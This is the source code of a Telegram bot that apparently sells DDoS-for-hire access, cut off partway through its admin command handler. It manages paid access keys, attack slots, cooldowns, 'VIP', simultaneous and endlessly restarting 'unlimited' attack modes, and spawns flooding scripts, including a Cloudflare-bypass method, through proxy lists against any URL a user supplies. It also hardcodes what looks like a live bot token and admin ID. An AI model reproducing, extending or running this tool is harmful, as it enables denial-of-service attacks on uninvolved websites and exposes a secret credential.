const fs = require('fs');
const { spawn } = require('child_process');
const chalk = require('chalk');
const moment = require('moment');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// Configuration
const config = {
  botToken: '8529211493:AAEht30opTKb13NLV6zeqZ4Jr6XKB1kXgLo',
  botName: "Permanent",
  adminId: 6837307356,
  maxFreeTime: 120,
  adminMaxTime: 999999,
  cooldownTime: 10,
  validMethods: ['zaher', 'zaherH2', 'cfzaher'],
  vipMethods: ['zaher', 'zaherH2', 'cfzaher'],
  simulMethods: ['zaher'],
  methodsFile: path.join(__dirname, 'assets', 'methods.json'),
  userDataFile: path.join(__dirname, 'data', 'users.json'),
  keysFile: path.join(__dirname, 'data', 'keys.json'),
  configFile: path.join(__dirname, 'data', 'config.json'),
  maxSlots: 3,
  adminMaxSlots: 10,
  pollingOptions: {
    interval: 300,
    timeout: 10,
    limit: 100,
    retryTimeout: 5000,
    params: {
      timeout: 10
    }
  },
  simultaneousAttacks: {
    enabled: true,
    maxConcurrent: 5,
    defaultMethods: ['zaher', 'zaherH2', 'cfzaher'],
    cooldownMultiplier: 1.5
  }
};

// Initialize bot with better error handling
let bot;
try {
  bot = new TelegramBot(config.botToken, { 
    polling: config.pollingOptions 
  });
  console.log(chalk.green('🤖 Bot initialized with polling...'));
} catch (error) {
  console.error(chalk.red('❌ Failed to initialize bot:'), error);
  process.exit(1);
}

// Track attack status per user
const userAttackStatus = new Map();

// Track active attacks for stopping functionality
const activeAttacks = new Map();

// Track user attack slots
const userAttackSlots = new Map();

// Track unlimited attacks
const unlimitedAttacks = new Map();

// Store user data for broadcast functionality
let userData = {};

// Store keys data
let keysData = {};

// Load and save config for VIP/SIMUL methods
const loadConfig = () => {
  try {
    if (fs.existsSync(config.configFile)) {
      const data = fs.readFileSync(config.configFile, 'utf8');
      const savedConfig = JSON.parse(data);
      
      if (savedConfig.vipMethods) {
        config.vipMethods = savedConfig.vipMethods;
      }
      if (savedConfig.simulMethods) {
        config.simulMethods = savedConfig.simulMethods;
      }
      if (savedConfig.simultaneousAttacks) {
        config.simultaneousAttacks.maxConcurrent = savedConfig.simultaneousAttacks.maxConcurrent;
      }
     
      console.log(chalk.green('✅ Loaded saved configuration'));
    }
  } catch (err) {
    console.error(chalk.red('❌ Error loading config:'), err);
  }
};

const saveConfig = () => {
  try {
    const dir = path.dirname(config.configFile);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    const configToSave = {
      vipMethods: config.vipMethods,
      simulMethods: config.simulMethods,
      simultaneousAttacks: {
        maxConcurrent: config.simultaneousAttacks.maxConcurrent
      },
      lastUpdated: new Date().toISOString()
    };
    
    fs.writeFileSync(config.configFile, JSON.stringify(configToSave, null, 2));
    console.log(chalk.green('✅ Configuration saved'));
  } catch (err) {
    console.error(chalk.red('❌ Error saving config:'), err);
  }
};

// Default methods data as fallback
const defaultMethods = [
  { name: 'ZAHER', description: 'Zaher method attack', sts: 'Active' },
  { name: 'ZAHERH2', description: 'H2 version of Zaher method', sts: 'Active' },
  { name: 'CFZAHER', description: 'Cloudflare Zaher method', sts: 'Active' }
];

// Load user data from file
const loadUserData = () => {
  try {
    if (fs.existsSync(config.userDataFile)) {
      const data = fs.readFileSync(config.userDataFile, 'utf8');
      userData = JSON.parse(data);
    }
  } catch (err) {
    console.error('Error loading user data:', err);
  }
};

// Save user data to file
const saveUserData = () => {
  try {
    const dir = path.dirname(config.userDataFile);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(config.userDataFile, JSON.stringify(userData, null, 2));
  } catch (err) {
    console.error('Error saving user data:', err);
  }
};

// Load keys data from file
const loadKeysData = () => {
  try {
    if (fs.existsSync(config.keysFile)) {
      const data = fs.readFileSync(config.keysFile, 'utf8');
      keysData = JSON.parse(data);
    }
  } catch (err) {
    console.error('Error loading keys data:', err);
  }
};

// Save keys data to file
const saveKeysData = () => {
  try {
    const dir = path.dirname(config.keysFile);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    fs.writeFileSync(config.keysFile, JSON.stringify(keysData, null, 2));
  } catch (err) {
    console.error('Error saving keys data:', err);
  }
};

// Record user activity
const recordUserActivity = (userId, username, chatId) => {
  if (!userData[userId]) {
    userData[userId] = {
      username: username || `user_${userId}`,
      chatId: chatId,
      firstSeen: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      attackCount: 0,
      key: null,
      simultaneousAttacks: 0
    };
  } else {
    userData[userId].lastSeen = new Date().toISOString();
    userData[userId].username = username || userData[userId].username;
  }
  saveUserData();
};

// Utility functions
const utils = {
  formatMethodsList: () => {
    try {
      if (!fs.existsSync(config.methodsFile)) {
        console.log(chalk.yellow('Methods file not found, using default methods'));
        return utils.formatMethods(defaultMethods);
      }
      
      const data = fs.readFileSync(config.methodsFile, 'utf8');
      const methods = JSON.parse(data);
      
      return utils.formatMethods(methods);
    } catch (err) {
      console.error(chalk.red('Error loading methods:'), err);
      return utils.formatMethods(defaultMethods);
    }
  },

  formatMethods: (methods) => {
    return methods.reduce((response, m) => {
      return response + `*${m.name}* | ${m.description} | ${m.sts}\n`;
    }, "*📊 Available Methods:*\nName | Description | Status\n-----------------------------\n");
  },

  errorMessage: () => {
    return `
*❌ Invalid Command*
Syntax: <method> <url> <port> <time>
Example: ZAHER https://example.com 443 120

Type /help for more information.
`;
  },

  helpMessage: () => {
    return `
*🤖 Available Commands*

/methods  - View all attack methods
/help     - Show this help message
/status   - Check your attack status
/owner    - Contact administrator
/stop     - Stop all attacks (Admin only)
/key      - Set your access key
/mykey    - Check your current key
/slots    - Check your attack slots

*⚡ Attack Commands*
<method> <url> <port> <time> - Run specific attack
/ddos <url> <time> - Run DDoS attack (2x power)
/vip <url> <time> - Run VIP attack (Multiple methods simultaneously)
/simul <url> <time> - Run simultaneous attacks
/simul Unlimited <url> - Run unlimited simultaneous attacks (auto-restart every 120s)
/multi <url> <time> <methods> - Run custom simultaneous attacks

*🆕 New Methods:*
BYPASS, GFLOOD, GHOST, KONTOL, L4, TCP, HTTPW

*📋 Examples:*
ZAHER https://example.com 443 120
/simul Unlimited https://example.com
`;
  },

  adminContact: () => {
    return `
______________________
👤 Contact Administrator
Telegram: @FoundCount
______________________
`;
  },

  attackDetailsMessage: (method, url, port, time) => {
    const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
    return `
* Attack Launched Successfully!*
|-➤Target: ${url}
|-➤Port: ${port}
|-➤Duration: ${time} seconds
|-➤Method: ${method.toUpperCase()}
|-➤Started: ${startTime}
`;
  },

  vipAttackDetailsMessage: (url, time) => {
    const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
    return `
* VIP Attack Launched Successfully!*
|-➤Target: ${url}
|-➤Duration: ${time} seconds
|-➤Methods: ${config.vipMethods.join(', ').toUpperCase()} (Simultaneous)
|-➤Started: ${startTime}
|-➤Power: ${config.vipMethods.length}x attack power
`;
  },

  simultaneousAttackDetailsMessage: (url, time, methods = []) => {
    const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
    const attackMethods = methods.length > 0 ? methods : config.simulMethods;
    return `
* SIMULTANEOUS ATTACK LAUNCHED!*

|-➤Target: ${url}
|-➤Duration: ${time} seconds
|-➤Methods: ${attackMethods.join(', ').toUpperCase()}
|-➤Attack Count: ${attackMethods.length} simultaneous attacks
|-➤Started: ${startTime}
|-➤Power: ${attackMethods.length}x normal power
    `;
  },

  multiAttackDetailsMessage: (url, time, methods) => {
    const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
    return `
* CUSTOM SIMULTANEOUS ATTACK!*

|-➤Target: ${url}
|-➤Duration: ${time} seconds
|-➤Methods: ${methods.join(', ').toUpperCase()}
|-➤Attack Count: ${methods.length} simultaneous attacks
|-➤Started: ${startTime}
|-➤Power: ${methods.length}x normal power
    `;
  },

  unlimitedAttackDetailsMessage: (url) => {
    const startTime = moment().format('YYYY-MM-DD HH:mm:ss');
    return `
* UNLIMITED ATTACK STARTED!*

|-➤Target: ${url}
|-➤Cycle: 120 seconds
|-➤Mode: Auto-restart until /stop
|-➤Methods: ${config.simulMethods.join(', ').toUpperCase()}
|-➤Started: ${startTime}
|-➤Status:  Running continuously
    `;
  },

  validateInputs: (url, port, time, userId, maxTime = config.maxFreeTime) => {
    if (userId === config.adminId) {
      maxTime = config.adminMaxTime;
    }
    
    try {
      new URL(url);
    } catch {
      return "Invalid URL format. Please include http:// or https://";
    }
    
    if (port && (isNaN(port) || port < 1 || port > 65535)) {
      return "Port must be a number between 1 and 65535";
    }
    
    if (time && (isNaN(time) || time <= 0)) {
      return "Time must be a positive number";
    }
    
    if (time && time > maxTime) {
      return `Time cannot exceed ${maxTime} seconds`;
    }
    
    return null;
  },

  isAdmin: (userId) => {
    return userId === config.adminId;
  },

  validateKey: (key) => {
    return keysData[key] && keysData[key].enabled;
  },

  formatKeysList: () => {
    let response = "*🔑 Key List:*\n\n";
    for (const [key, data] of Object.entries(keysData)) {
      response += `Key: ${key}\n`;
      response += `Type: ${data.type}\n`;
      response += `Status: ${data.enabled ? '✅ Enabled' : '❌ Disabled'}\n`;
      response += `Created: ${moment(data.createdAt).format('YYYY-MM-DD')}\n`;
      response += `Used by: ${data.usedBy.length} users\n`;
      response += `────────────────\n`;
    }
    return response;
  },

  getMaxSlots: (userId) => {
    return utils.isAdmin(userId) ? config.adminMaxSlots : config.maxSlots;
  },

  getUserSlots: (userId) => {
    return userAttackSlots.get(userId) || [];
  },

  hasAvailableSlot: (userId) => {
    const userSlots = utils.getUserSlots(userId);
    const maxSlots = utils.getMaxSlots(userId);
    return userSlots.length < maxSlots;
  },

  addAttackToSlot: (userId, attackId) => {
    const userSlots = utils.getUserSlots(userId);
    userSlots.push(attackId);
    userAttackSlots.set(userId, userSlots);
  },

  removeAttackFromSlot: (userId, attackId) => {
    const userSlots = utils.getUserSlots(userId);
    const index = userSlots.indexOf(attackId);
    if (index > -1) {
      userSlots.splice(index, 1);
      userAttackSlots.set(userId, userSlots);
    }
  },

  formatSlotsInfo: (userId) => {
    const userSlots = utils.getUserSlots(userId);
    const maxSlots = utils.getMaxSlots(userId);
    const usedSlots = userSlots.length;
    const availableSlots = maxSlots - usedSlots;
    
    let response = `*🎯 Your Attack Slots*\n\n`;
    response += `Used: ${usedSlots}/${maxSlots}\n`;
    response += `Available: ${availableSlots}\n\n`;
    
    if (usedSlots > 0) {
      response += `*Active Attacks:*\n`;
      userSlots.forEach((attackId, index) => {
        const attack = activeAttacks.get(attackId);
        if (attack) {
          const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
          const remaining = attack.duration - elapsed;
          response += `${index + 1}. ${attack.method.toUpperCase()} on ${attack.target} (${remaining}s left)\n`;
        }
      });
    }
    
    return response;
  },

  canRunSimultaneous: (userId, methodCount) => {
    const userSlots = utils.getUserSlots(userId);
    const maxSlots = utils.getMaxSlots(userId);
    return (userSlots.length + methodCount) <= maxSlots;
  },

  validateSimultaneousMethods: (methods) => {
    const invalidMethods = methods.filter(m => !config.validMethods.includes(m) && m !== 'ddos');
    if (invalidMethods.length > 0) {
      return `Invalid methods: ${invalidMethods.join(', ')}`;
    }
    
    if (methods.length > config.simultaneousAttacks.maxConcurrent) {
      return `Maximum ${config.simultaneousAttacks.maxConcurrent} methods allowed for simultaneous attacks`;
    }
    
    return null;
  }
};

// Unlimited attack manager
const unlimitedAttackManager = {
  startUnlimitedAttack: async (userId, chatId, url) => {
    const attackId = 'unlimited_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    const runAttackCycle = async () => {
      if (!unlimitedAttacks.has(attackId)) return;
      
      try {
        console.log(chalk.blue(`♾️ Starting unlimited attack cycle for ${url}`));
        
        // Run attack for 120 seconds
        await attackExecutor.runSimultaneousAttacks(url, '120', userId, chatId);
        
        // Check if still in unlimited mode
        if (unlimitedAttacks.has(attackId)) {
          console.log(chalk.blue(`♾️ Unlimited attack cycle completed, restarting...`));
          // Wait a moment before restarting
          setTimeout(() => {
            if (unlimitedAttacks.has(attackId)) {
              runAttackCycle();
            }
          }, 2000);
        }
      } catch (err) {
        console.error(chalk.red(`❌ Unlimited attack cycle error:`), err);
        // Continue anyway for unlimited mode
        if (unlimitedAttacks.has(attackId)) {
          setTimeout(() => {
            if (unlimitedAttacks.has(attackId)) {
              runAttackCycle();
            }
          }, 5000);
        }
      }
    };
    
    unlimitedAttacks.set(attackId, {
      userId,
      chatId,
      url,
      method: 'simul',
      startTime: Date.now(),
      isRunning: true,
      cycleCount: 0
    });
    
    // Start the first attack cycle
    runAttackCycle();
    
    return attackId;
  },
  
  stopUnlimitedAttack: (attackId) => {
    if (unlimitedAttacks.has(attackId)) {
      unlimitedAttacks.delete(attackId);
      return true;
    }
    return false;
  },
  
  stopAllUserUnlimitedAttacks: (userId) => {
    let stoppedCount = 0;
    for (const [attackId, attack] of unlimitedAttacks.entries()) {
      if (attack.userId === userId) {
        unlimitedAttacks.delete(attackId);
        stoppedCount++;
      }
    }
    return stoppedCount;
  },
  
  getUserUnlimitedAttacks: (userId) => {
    const userAttacks = [];
    for (const [attackId, attack] of unlimitedAttacks.entries()) {
      if (attack.userId === userId) {
        userAttacks.push({ attackId, ...attack });
      }
    }
    return userAttacks;
  },
  
  hasUnlimitedAttack: (userId) => {
    return unlimitedAttackManager.getUserUnlimitedAttacks(userId).length > 0;
  }
};

// Attack management
const attackManager = {
  canUserAttack: (userId) => {
    if (utils.isAdmin(userId)) return true;
    
    if (!userData[userId] || !userData[userId].key || !utils.validateKey(userData[userId].key)) {
      return false;
    }
    
    const userStatus = userAttackStatus.get(userId);
    if (!userStatus) return true;
    
    const now = Date.now();
    if (userStatus.status === 'running') return false;
    if (userStatus.status === 'cooldown' && now < userStatus.readyTime) return false;
    
    return true;
  },

  setUserStatus: (userId, status, cooldownMs = config.cooldownTime * 1000) => {
    if (status === 'running') {
      userAttackStatus.set(userId, { status: 'running' });
    } else if (status === 'cooldown') {
      userAttackStatus.set(userId, { 
        status: 'cooldown', 
        readyTime: Date.now() + cooldownMs 
      });
    }
  },

  getRemainingCooldown: (userId) => {
    const userStatus = userAttackStatus.get(userId);
    if (userStatus && userStatus.status === 'cooldown') {
      return Math.ceil((userStatus.readyTime - Date.now()) / 1000);
    }
    return 0;
  },

  clearUserStatus: (userId) => {
    userAttackStatus.delete(userId);
  },

  stopAllAttacks: async () => {
    let stoppedCount = 0;
    for (const [attackId, attack] of activeAttacks.entries()) {
      try {
        if (attack.child) {
          attack.child.kill('SIGTERM');
          stoppedCount++;
          
          utils.removeAttackFromSlot(attack.userId, attackId);
          
          await bot.sendMessage(
            attack.chatId, 
            `⛔ Your attack has been stopped by administrator`
          );
        }
      } catch (err) {
        console.error(chalk.red(`Error stopping attack ${attackId}:`), err);
      }
    }
    
    // Stop unlimited attacks
    const unlimitedCount = Array.from(unlimitedAttacks.keys()).length;
    unlimitedAttacks.clear();
    
    activeAttacks.clear();
    return stoppedCount + unlimitedCount;
  },

  stopUserAttacks: async (userId) => {
    let stoppedCount = 0;
    const userSlots = utils.getUserSlots(userId);
    
    for (const attackId of userSlots) {
      try {
        const attack = activeAttacks.get(attackId);
        if (attack && attack.child) {
          attack.child.kill('SIGTERM');
          stoppedCount++;
          activeAttacks.delete(attackId);
          
          await bot.sendMessage(
            attack.chatId, 
            `⛔ Your attack on ${attack.target} has been stopped`
          );
        }
      } catch (err) {
        console.error(chalk.red(`Error stopping attack ${attackId}:`), err);
      }
    }
    
    // Stop unlimited attacks for user
    const unlimitedStopped = unlimitedAttackManager.stopAllUserUnlimitedAttacks(userId);
    stoppedCount += unlimitedStopped;
    
    userAttackSlots.set(userId, []);
    return stoppedCount;
  }
};

// Attack execution functions
const attackExecutor = {
  runAttack: (method, url, port, time, userId, chatId) => {
    return new Promise((resolve, reject) => {
      const attackId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
      
      let scriptName = method.toUpperCase();
      let args = [];
      
      switch(method.toLowerCase()) {
        case 'zaher':
          args = [scriptName + '.js', url, time, '85', '10', 'proxy.txt'];
          break;
        case 'zaherH2':
          args = [scriptName + '.js', url, time, '100', '11', 'proxy.txt'];
          break;
        case 'cfzaher':
          args = [scriptName + '.js', url, time, '58', '16', 'proxy.txt'];
          break;
        default:
          args = [scriptName + '.js', url, time, '64', '10', 'proxy.txt'];
      }
      
      const scriptPath = path.join(__dirname, scriptName + '.js');
      
      if (!fs.existsSync(scriptPath)) {
        reject(new Error(`Attack script for ${method} not found`));
        return;
      }
      
      console.log(chalk.blue(`Starting ${method} attack: node ${args.join(' ')}`));
      
      const child = spawn('node', args, { stdio: 'inherit' });
      
      const attackInfo = {
        userId: userId,
        chatId: chatId,
        child: child,
        target: url,
        method: method,
        startTime: Date.now(),
        duration: parseInt(time) * 1000,
        attackId: attackId
      };
      
      activeAttacks.set(attackId, attackInfo);
      utils.addAttackToSlot(userId, attackId);
      
      const timeout = setTimeout(() => {
        if (activeAttacks.has(attackId)) {
          child.kill('SIGTERM');
          activeAttacks.delete(attackId);
          utils.removeAttackFromSlot(userId, attackId);
        }
      }, parseInt(time) * 1000);
      
      child.on('exit', (code, signal) => {
        clearTimeout(timeout);
        if (activeAttacks.has(attackId)) {
          activeAttacks.delete(attackId);
          utils.removeAttackFromSlot(userId, attackId);
        }
        
        if (code === 0 || signal === 'SIGTERM') {
          resolve(attackId);
        } else {
          reject(new Error(`${method} attack script exited with code ${code}`));
        }
      });
      
      child.on('error', (err) => {
        clearTimeout(timeout);
        if (activeAttacks.has(attackId)) {
          activeAttacks.delete(attackId);
          utils.removeAttackFromSlot(userId, attackId);
        }
        reject(err);
      });
    });
  },

  runDdosAttack: (url, time, userId, chatId) => {
    return new Promise((resolve, reject) => {
      const attackId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
      const scriptPath = path.join(__dirname, 'ddos.js');
      
      if (!fs.existsSync(scriptPath)) {
        reject(new Error('DDoS attack script not found'));
        return;
      }
      
      const args = [scriptPath, url, time];
      
      console.log(chalk.blue(`Starting DDoS attack: node ${args.join(' ')}`));
      
      const child = spawn('node', args);
      child.stdin.write(url + '\n');
      child.stdin.end();

      const attackInfo = {
        userId: userId,
        chatId: chatId,
        child: child,
        target: url,
        method: 'DDoS',
        startTime: Date.now(),
        duration: parseInt(time) * 1000,
        attackId: attackId
      };

      activeAttacks.set(attackId, attackInfo);
      utils.addAttackToSlot(userId, attackId);

      const timeout = setTimeout(() => {
        if (activeAttacks.has(attackId)) {
          child.kill('SIGTERM');
          activeAttacks.delete(attackId);
          utils.removeAttackFromSlot(userId, attackId);
        }
      }, parseInt(time) * 1000);

      child.on('exit', (code, signal) => {
        clearTimeout(timeout);
        if (activeAttacks.has(attackId)) {
          activeAttacks.delete(attackId);
          utils.removeAttackFromSlot(userId, attackId);
        }
        
        if (code === 0 || signal === 'SIGTERM') {
          resolve(attackId);
        } else {
          reject(new Error(`DDoS script exited with code ${code}`));
        }
      });

      child.on('error', (err) => {
        clearTimeout(timeout);
        if (activeAttacks.has(attackId)) {
          activeAttacks.delete(attackId);
          utils.removeAttackFromSlot(userId, attackId);
        }
        reject(err);
      });
    });
  },

  runVipAttack: (url, time, userId, chatId) => {
    return new Promise(async (resolve, reject) => {
      try {
        const attackPromises = [];
        
        for (const method of config.vipMethods) {
          if (method === 'ddos') {
            attackPromises.push(attackExecutor.runDdosAttack(url, time, userId, chatId));
          } else {
            attackPromises.push(attackExecutor.runAttack(method, url, 443, time, userId, chatId));
          }
        }
        
        const results = await Promise.allSettled(attackPromises);
        
        const failedAttacks = results.filter(result => result.status === 'rejected');
        if (failedAttacks.length > 0) {
          console.error(chalk.red(`❌ ${failedAttacks.length} VIP attacks failed`));
        }
        
        resolve({
          success: true,
          methodCount: config.vipMethods.length,
          failed: failedAttacks.length
        });
      } catch (err) {
        console.error(chalk.red('❌ VIP attack error:'), err);
        reject(err);
      }
    });
  },

  runSimultaneousAttacks: async (url, time, userId, chatId, customMethods = []) => {
    return new Promise(async (resolve, reject) => {
      try {
        const methods = customMethods.length > 0 ? customMethods : config.simulMethods;
        const attackPromises = [];
        
        for (const method of methods) {
          if (method === 'ddos') {
            attackPromises.push(attackExecutor.runDdosAttack(url, time, userId, chatId));
          } else {
            attackPromises.push(attackExecutor.runAttack(method, url, 443, time, userId, chatId));
          }
        }
        
        const results = await Promise.allSettled(attackPromises);
        
        const failedAttacks = results.filter(result => result.status === 'rejected');
        if (failedAttacks.length > 0) {
          console.error(chalk.red(`❌ ${failedAttacks.length} simultaneous attacks failed`));
        }
        
        resolve({
          success: true,
          methodCount: methods.length,
          failed: failedAttacks.length
        });
      } catch (err) {
        console.error(chalk.red('❌ Simultaneous attack error:'), err);
        reject(err);
      }
    });
  },

  runCustomSimultaneousAttack: async (url, time, methods, userId, chatId) => {
    return new Promise(async (resolve, reject) => {
      try {
        const validationError = utils.validateSimultaneousMethods(methods);
        if (validationError) {
          reject(new Error(validationError));
          return;
        }

        const attackPromises = [];
        
        for (const method of methods) {
          if (method === 'ddos') {
            attackPromises.push(attackExecutor.runDdosAttack(url, time, userId, chatId));
          } else {
            attackPromises.push(attackExecutor.runAttack(method, url, 443, time, userId, chatId));
          }
        }
        
        const results = await Promise.allSettled(attackPromises);
        
        const failedAttacks = results.filter(result => result.status === 'rejected');
        if (failedAttacks.length > 0) {
          console.error(chalk.red(`❌ ${failedAttacks.length} custom attacks failed`));
        }
        
        resolve({
          success: true,
          methodCount: methods.length,
          failed: failedAttacks.length
        });
      } catch (err) {
        console.error(chalk.red('❌ Custom simultaneous attack error:'), err);
        reject(err);
      }
    });
  }
};

// Admin commands
const adminCommands = {
  isAdmin: (userId) => userId === config.adminId,

  handleAdminCommand: async (chatId, userId, inputs) => {
    if (!adminCommands.isAdmin(userId)) {
      await bot.sendMessage(chatId, "❌ Access denied. Admin only.");
      return;
    }

    const command = inputs[1] ? inputs[1].toLowerCase() : 'help';
    
    switch (command) {
      case 'status':
        const activeCount = activeAttacks.size;
        const unlimitedCount = Array.from(unlimitedAttacks.keys()).length;
        const totalUsers = Object.keys(userData).length;
        await bot.sendMessage(
          chatId, 
          ` *Bot Status*\n\n` +
          ` Bot is running properly\n` +
          ` Active attacks: ${activeCount}\n` +
          ` Unlimited attacks: ${unlimitedCount}\n` +
          ` Total users: ${totalUsers}\n` +
          ` Cooldown time: ${config.cooldownTime} seconds\n` +
          ` Max slots (user/admin): ${config.maxSlots}/${config.adminMaxSlots}\n` +
          ` VIP Methods: ${config.vipMethods.join(', ')}\n` +
          ` SIMUL Methods: ${config.simulMethods.join(', ')}\n` +
          ` Max Concurrent: ${config.simultaneousAttacks.maxConcurrent}\n` +
          ` Total Methods: ${config.validMethods.length}\n` +
          ` Server time: ${moment().format('YYYY-MM-DD HH:mm:ss')}`
        );
        break;
        
      case 'users':
        const activeUsers = userAttackSlots.size;
        let userList = " *Active Users:*\n";
        userAttackSlots.forEach((slots, uid) => {
          const username = userData[uid] ? userData[uid].username : `User_${uid}`;
          const unlimited = unlimitedAttackManager.hasUnlimitedAttack(uid) ? ' ♾️' : '';
          userList += `• ${username} (${uid}) - Active attacks: ${slots.length}${unlimited}\n`;
        });
        await bot.sendMessage(chatId, userList || "No active users");
        break;
        
      case 'methods':
        await bot.sendMessage(chatId, utils.formatMethodsList(), { parse_mode: 'Markdown' });
        break;
        
      case 'stop':
        const stoppedCount = await attackManager.stopAllAttacks();
        await bot.sendMessage(chatId, ` Stopped ${stoppedCount} active attacks`);
        break;
        
      case 'broadcast':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin broadcast <message>");
          return;
        }
        const broadcastMessage = inputs.slice(2).join(' ');
        let sentCount = 0;
        let errorCount = 0;
        
        for (const [uid, data] of Object.entries(userData)) {
          try {
            await bot.sendMessage(data.chatId, ` *Admin Broadcast:*\n${broadcastMessage}`, { parse_mode: 'Markdown' });
            sentCount++;
          } catch (err) {
            errorCount++;
            console.error(`Failed to send to ${uid}:`, err.message);
          }
        }
        
        await bot.sendMessage(chatId, ` Broadcast sent to ${sentCount} users. Failed: ${errorCount}`);
        break;
        
      case 'cooldown':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin cooldown <seconds>");
          return;
        }
        const newCooldown = parseInt(inputs[2]);
        if (isNaN(newCooldown) || newCooldown < 0) {
          await bot.sendMessage(chatId, "Cooldown must be a positive number");
          return;
        }
        config.cooldownTime = newCooldown;
        await bot.sendMessage(chatId, ` Cooldown time set to ${newCooldown} seconds`);
        break;
        
      case 'clearlogs':
        activeAttacks.clear();
        userAttackSlots.clear();
        userAttackStatus.clear();
        unlimitedAttacks.clear();
        await bot.sendMessage(chatId, " Cleared all active attacks and user status");
        break;
        
      case 'restart':
        await bot.sendMessage(chatId, " Restarting bot functionality...");
        break;

      case 'delkey':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin delkey <key>");
          return;
        }
        const keyToDelete = inputs[2].toUpperCase();
        if (keysData[keyToDelete]) {
          delete keysData[keyToDelete];
          saveKeysData();
          await bot.sendMessage(chatId, `✅ Key ${keyToDelete} has been deleted`);
        } else {
          await bot.sendMessage(chatId, `❌ Key ${keyToDelete} not found`);
        }
        break;
        
      case 'disablekey':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin disablekey <key>");
          return;
        }
        const keyToDisable = inputs[2].toUpperCase();
        if (keysData[keyToDisable]) {
          keysData[keyToDisable].enabled = false;
          saveKeysData();
          await bot.sendMessage(chatId, `✅ Key ${keyToDisable} has been disabled`);
        } else {
          await bot.sendMessage(chatId, `❌ Key ${keyToDisable} not found`);
        }
        break;
        
      case 'enablekey':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin enablekey <key>");
          return;
        }
        const keyToEnable = inputs[2].toUpperCase();
        if (keysData[keyToEnable]) {
          keysData[keyToEnable].enabled = true;
          saveKeysData();
          await bot.sendMessage(chatId, `✅ Key ${keyToEnable} has been enabled`);
        } else {
          await bot.sendMessage(chatId, `❌ Key ${keyToEnable} not found`);
        }
        break;
        
      case 'keys':
        await bot.sendMessage(chatId, utils.formatKeysList(), { parse_mode: 'Markdown' });
        break;

      case 'addkey':
        if (inputs.length < 4) {
          await bot.sendMessage(chatId, "Usage: /admin addkey <type> <key>");
          return;
        }
        
        const keyType = inputs[2].toUpperCase();
        const keyValue = inputs[3].toUpperCase();
        
        if (keysData[keyValue]) {
          await bot.sendMessage(chatId, `❌ Key ${keyValue} already exists`);
          return;
        }
        
        keysData[keyValue] = {
          type: keyType,
          enabled: true,
          usedBy: [],
          createdAt: new Date().toISOString()
        };
        
        saveKeysData();
        await bot.sendMessage(
          chatId, 
          `✅ Key added successfully!\n\nKey: ${keyValue}\nType: ${keyType}\nStatus: ✅ Enabled`
        );
        break;
        
      case 'slots':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin slots <userId>");
          return;
        }
        
        const targetUserId = parseInt(inputs[2]);
        if (isNaN(targetUserId)) {
          await bot.sendMessage(chatId, "Invalid user ID");
          return;
        }
        
        const targetSlots = utils.getUserSlots(targetUserId);
        const targetMaxSlots = utils.getMaxSlots(targetUserId);
        const targetUsername = userData[targetUserId] ? userData[targetUserId].username : `User_${targetUserId}`;
        const targetUnlimited = unlimitedAttackManager.hasUnlimitedAttack(targetUserId);
        
        await bot.sendMessage(
          chatId,
          `🎯 *Slots for ${targetUsername}*\n\n` +
          `Used: ${targetSlots.length}/${targetMaxSlots}\n` +
          `Active attacks: ${targetSlots.length}\n` +
          `Unlimited attack: ${targetUnlimited ? '✅ Yes' : '❌ No'}\n\n` +
          (targetSlots.length > 0 ? `*Active Attacks:*\n${targetSlots.map((id, i) => `${i+1}. ${id}`).join('\n')}` : 'No active attacks')
        );
        break;

      case 'setvip':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin setvip <method1,method2,...>\nExample: /admin setvip tls,ddos,http,bypass,gflood");
          return;
        }
        
        const newVipMethods = inputs[2].split(',').map(m => m.trim().toLowerCase());
        const invalidVipMethods = newVipMethods.filter(m => !config.validMethods.includes(m) && m !== 'ddos');
        
        if (invalidVipMethods.length > 0) {
          await bot.sendMessage(chatId, `❌ Invalid VIP methods: ${invalidVipMethods.join(', ')}\nValid methods: ${config.validMethods.join(', ')}`);
          return;
        }
        
        config.vipMethods = newVipMethods;
        saveConfig();
        await bot.sendMessage(chatId, `✅ VIP methods updated and saved: ${newVipMethods.join(', ').toUpperCase()}`);
        break;

      case 'showvip':
        await bot.sendMessage(chatId, `🎯 Current VIP methods: ${config.vipMethods.join(', ').toUpperCase()}`);
        break;

      case 'setsimul':
        if (inputs.length < 3) {
          await bot.sendMessage(chatId, "Usage: /admin setsimul <method1,method2,...>\nExample: /admin setsimul tls,kill,ddos,http,bypass,gflood");
          return;
        }
        
        const newSimulMethods = inputs[2].split(',').map(m => m.trim().toLowerCase());
        const invalidSimulMethods = newSimulMethods.filter(m => !config.validMethods.includes(m) && m !== 'ddos');
        
        if (invalidSimulMethods.length > 0) {
          await bot.sendMessage(chatId, `❌ Invalid SIMULTANEOUS methods: ${invalidSimulMethods.join(', ')}\nValid methods: ${config.validMethods.join(', ')}`);
          return;
        }
        
        config.simulMethods = newSimulMethods;
        saveConfig();
        await bot.sendMessage(chatId, `✅ SIMULTANEOUS methods updated and saved: ${newSimulMethods.join(', ').toUpperCase()}`);
        break;

      case 'showsimul':
        await bot.sendMessage(chatId, `💥 Current SIMULTANEOUS methods: ${config.simulMethods.join(', ').toUpperCase()}`);
        break;

      case 'setconcurrent':
        if (inputs.length < 3) {
